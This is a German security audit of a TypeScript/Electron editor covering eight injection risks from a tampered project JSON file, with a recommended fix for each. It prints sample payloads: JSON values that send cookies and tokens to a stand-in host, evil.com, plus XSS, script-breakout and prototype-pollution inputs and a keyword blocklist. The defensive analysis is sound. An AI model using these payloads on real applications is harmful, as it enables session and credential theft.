# Security-Audit: HTML-Injection & JSON-Manipulation

**Datum:** 12.04.2026  
**Scope:** Analyse der Angriffsvektoren bei manipulierter Projekt-JSON-Datei

---

## Angriffsszenario

Ein Angreifer modifiziert die **Projekt-JSON-Datei** außerhalb der App (z.B. mit einem Texteditor) und fügt schadhaften Code ein. Die App lädt die Datei und der eingeschleuste Code wird ausgeführt.

---

## Übersicht

| # | Schwere | Vektor | Datei | Zeile |
|---|---------|--------|-------|-------|
| 1 | KRITISCH | `new Function(expression)` – Code Execution | `ExpressionParser.ts` | 209 |
| 2 | KRITISCH | `innerHTML = htmlContent` – XSS via RichText | `TextObjectRenderer.ts` | 64 |
| 3 | HOCH | Dropdown-Options ohne Escaping | `InputRenderer.ts` | 214 |
| 4 | HOCH | Tooltip innerHTML | `FlowInteractionManager.ts` | 532 |
| 5 | HOCH | ContextMenu innerHTML | `ContextMenu.ts` | 101 |
| 6 | HOCH | `</script>` Breakout im Export | `GameExporter.ts` | 447 |
| 7 | MITTEL | Generische Hydration (Prototype Pollution) | `Serialization.ts` | 70 |
| 8 | MITTEL | Electron Path Traversal | `main.cjs` | 65 |

---

## 1. KRITISCH: Arbitrary Code Execution via ExpressionParser

**Datei:** `src/runtime/ExpressionParser.ts`, Zeile 209

```typescript
const func = new Function(...contextKeys, `return ${expression}`);
```

**Problem:** `new Function()` ist funktional identisch mit `eval()`. Ein Angreifer kann in der JSON-Datei eine Expression in ein Objekt-Property schreiben:

```json
{ "text": "${fetch('https://evil.com/steal?data='+document.cookie)}" }
```

oder:

```json
{ "text": "${(()=>{new XMLHttpRequest().open('GET','https://evil.com/'+localStorage.getItem('token'));})()}" }
```

Der `ExpressionParser` führt das über `new Function(...)` **direkt aus**.

**Auswirkung:** Volle Code-Ausführung im Renderer-Kontext. Zugriff auf DOM, localStorage, Netzwerk, und im Electron-Kontext potenziell auf `window.electronFS` (Dateisystem-Zugriff).

**Empfehlung:**
- Allowlist für erlaubte Funktionen/Operatoren einführen
- Alternativ: sicheren AST-basierten Parser verwenden (z.B. `jsep` oder eigener Mini-Parser)
- Expressions vor Ausführung validieren (keine Funktionsaufrufe, keine Property-Chains auf `window`/`document`)

---

## 2. KRITISCH: HTML-Injection via RichText (innerHTML)

**Datei:** `src/editor/services/renderers/TextObjectRenderer.ts`, Zeile 64-65

```typescript
if (el.innerHTML !== textValue) {
    el.innerHTML = textValue;
}
```

**Problem:** `htmlContent` aus der JSON wird **direkt als innerHTML** gesetzt. Ein Angreifer könnte einfügen:

```json
{ "className": "TRichText", "htmlContent": "<img src=x onerror='fetch(\"https://evil.com/\"+document.cookie)'>" }
```

**Hinweis:** Der `RichTextEditorDialog` hat eine `sanitizeHTML()`-Funktion, aber diese wird **nur beim Editieren im Dialog** aufgerufen – **nicht beim Laden** aus der JSON-Datei.

**Empfehlung:**
- `sanitizeHTML()` beim **Laden** von RichText-Content anwenden (in `hydrateObjects` oder im Renderer)
- `sanitizeHTML()` als zentrale Utility-Funktion extrahieren und an allen innerHTML-Stellen verwenden
- Content Security Policy (CSP) im Electron-Fenster aktivieren

---

## 3. HOCH: Dropdown-Option-Injection

**Datei:** `src/editor/services/renderers/InputRenderer.ts`, Zeile 214-215

```typescript
optionsList.forEach((opt, idx) => {
    expectedHtml += `<option value="${idx}">${opt}</option>`;
});
```

**Problem:** `opt` (aus `obj.options` in der JSON) wird ohne Escaping in HTML eingefügt:

```json
{ "options": ["Normal", "<img src=x onerror=alert(1)>"] }
```

**Empfehlung:**
- HTML-Escape-Funktion auf `opt` anwenden bevor es in den HTML-String eingefügt wird
- Alternativ: `document.createElement('option')` + `textContent` verwenden statt String-Konkatenation

---

## 4. HOCH: Tooltip-Injection (FlowNode)

**Datei:** `src/editor/services/FlowInteractionManager.ts`, Zeile 532

```typescript
this.tooltipEl.innerHTML = `<strong ...>${node.Name}</strong>${node.Description}`;
```

**Problem:** `node.Name` und `node.Description` aus der JSON werden direkt als innerHTML gesetzt. Beide Felder können beliebiges HTML/JS enthalten.

**Empfehlung:**
- HTML-Escape auf `node.Name` und `node.Description` anwenden
- Oder: `textContent` verwenden und Styling per CSS lösen

---

## 5. HOCH: ContextMenu Label-Injection

**Datei:** `src/editor/ui/ContextMenu.ts`, Zeile 101

```typescript
el.innerHTML = `<span style="${item.color ? `color: ${item.color}` : ''}">${item.label}</span>`;
```

**Problem:** Falls `item.color` oder `item.label` aus der JSON kommen, ist CSS-Injection oder HTML-Injection möglich:

```json
{ "color": "\"><img src=x onerror=alert(1)>" }
```

**Empfehlung:**
- HTML-Escape auf `item.label` und `item.color` anwenden
- `item.color` gegen ein CSS-Color-Pattern validieren (Regex: `/^#[0-9a-fA-F]{3,8}$/` oder CSS-Farbnamen)

---

## 6. HOCH: HTML-Export Script-Injection

**Datei:** `src/export/GameExporter.ts`, Zeile 447

```typescript
window.PROJECT = ${projectJSON};
```

**Problem:** `projectJSON` wird direkt in ein `<script>`-Tag eingebettet. Ein String-Wert in der JSON mit `</script><script>alert(1)</script>` bricht aus dem Script-Tag aus und injiziert beliebigen Code.

**Empfehlung:**
- `</script>` in `projectJSON` escapen: `.replace(/<\/script>/gi, '<\\/script>')`
- Oder: Projekt-Daten als `<script type="application/json" id="project-data">` einbetten und per `JSON.parse()` lesen

---

## 7. MITTEL: Generische Hydration ohne Whitelist (Prototype Pollution)

**Datei:** `src/utils/Serialization.ts`, Zeile 70-74

```typescript
Object.keys(objData).forEach(key => {
    if (reservedKeys.includes(key)) return;
    if (key.startsWith('_')) return;
    const val = (objData as any)[key];
```

**Problem:** `hydrateObjects` kopiert **alle** JSON-Keys blind auf die Komponenteninstanz. Ein Angreifer könnte folgendes in die JSON schreiben:

```json
{ "__proto__": { "isAdmin": true }, "constructor": { "prototype": { "polluted": true } } }
```

Dies könnte zu Prototype Pollution führen und das Verhalten aller Objekte beeinflussen.

**Empfehlung:**
- `__proto__`, `constructor`, `prototype` zur `reservedKeys`-Liste hinzufügen
- Oder: nur Keys akzeptieren, die bereits auf der Instanz existieren (`key in newObj`)

---

## 8. MITTEL: Electron Path Traversal

**Datei:** `electron/main.cjs`, Zeile 65ff

**Problem:** Die IPC-Handler für `fs:readFile` und `fs:writeFile` akzeptieren beliebige absolute Pfade ohne Validierung. Ein manipulierter Renderer-Prozess könnte beliebige Dateien lesen/schreiben.

**Empfehlung:**
- Pfad-Validierung mit `ALLOWED_DIRS` und `path.resolve` implementieren
- Nur Zugriff auf Projektverzeichnis und Medien-Ordner erlauben
- `path.normalize()` verwenden um `..`-Traversal zu verhindern

---

## Empfohlene Maßnahmen (Priorität)

### Sofort (Kritisch)
1. **HTML-Escape-Utility** erstellen (`escapeHtml()`) und an allen `innerHTML`-Stellen verwenden wo Daten aus JSON kommen
2. **`sanitizeHTML()` beim Laden** von RichText-Content anwenden (nicht nur beim Editor-Dialog)
3. **ExpressionParser absichern** – Allowlist für erlaubte Operationen, keine direkten Funktionsaufrufe

### Kurzfristig (Hoch)
4. **`projectJSON` im Export** escapen (`</script>` ersetzen)
5. **Dropdown-Options** und **Tooltip-Texte** mit HTML-Escape versehen
6. **ContextMenu Labels** mit HTML-Escape versehen

### Mittelfristig
7. **Prototype Pollution Guard** in `hydrateObjects` einbauen
8. **Electron Path-Validierung** implementieren
9. **Content Security Policy (CSP)** im Electron-Fenster und im exportierten HTML aktivieren

---

## Zentrale Utility-Funktion (Vorschlag)

```typescript
// src/utils/SecurityUtils.ts

export function escapeHtml(str: string): string {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

export function isValidCssColor(color: string): boolean {
    return /^#[0-9a-fA-F]{3,8}$/.test(color) || 
           /^(rgb|hsl)a?\([^)]+\)$/.test(color) ||
           /^[a-zA-Z]+$/.test(color);
}

export function sanitizeExpression(expr: string): boolean {
    // Blockiere: fetch, XMLHttpRequest, eval, Function, import, require,
    // window, document, localStorage, sessionStorage, electronFS
    const blocked = /\b(fetch|XMLHttpRequest|eval|Function|import|require|window|document|localStorage|sessionStorage|electronFS|alert|confirm|prompt)\b/i;
    return !blocked.test(expr);
}
```
